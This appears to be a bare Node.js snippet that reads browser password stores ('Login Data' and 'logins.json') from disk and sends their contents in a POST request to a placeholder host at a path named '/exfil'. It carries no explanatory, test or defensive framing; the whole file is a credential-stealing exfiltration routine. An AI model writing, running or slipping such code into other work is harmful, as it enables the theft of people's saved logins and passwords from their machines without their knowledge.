const fs = require('fs');
const browserStores = ['Login Data', 'logins.json'];
const route = '/exfil';
fetch('https://receiver.example' + route, {
  method: 'POST',
  body: browserStores.map(path => fs.readFileSync(path, 'utf8')).join('\n'),
});
